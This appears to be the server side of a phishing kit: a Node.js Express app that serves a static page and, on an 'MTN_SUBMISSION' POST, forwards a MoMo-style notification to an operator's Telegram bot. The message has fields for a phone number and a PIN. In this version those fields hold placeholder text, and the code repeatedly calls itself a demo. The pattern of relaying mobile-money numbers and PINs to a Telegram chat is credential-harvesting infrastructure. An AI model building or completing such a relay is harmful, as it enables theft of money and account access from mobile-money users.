const express = require("express");

const app = express();

app.use(express.json());
app.use(express.static(__dirname));

app.post("/api/mtn", async (req, res) => {
  try {
    if (req.body?.event !== "MTN_SUBMISSION") {
      return res.status(400).json({
        success: false,
        error: "Invalid demo event"
      });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Telegram environment variables are missing");
      return res.status(500).json({ success: false });
    }

    const message =
      "🧪 MOMO MTN BOT NOTIFICATION\n\n" +
      "✅ Application successful\n" +
      "📱 Test number:number entered\n" +
      "🔐 PIN:pincode entered\n" +
      "📊 Status: Demo completed";

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    const telegramData = await telegramResponse.json();

    console.log("Telegram response:", telegramResponse.status, telegramData.ok);

    if (!telegramResponse.ok || !telegramData.ok) {
      return res.status(502).json({ success: false });
    }

    return res.json({ success: true });

  } catch (error) {
    console.error("Demo notification error:", error);
    return res.status(500).json({ success: false });
  }
});

const PORT = process.env.PORT || 10000;

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Demo server running on port ${PORT}`);
});
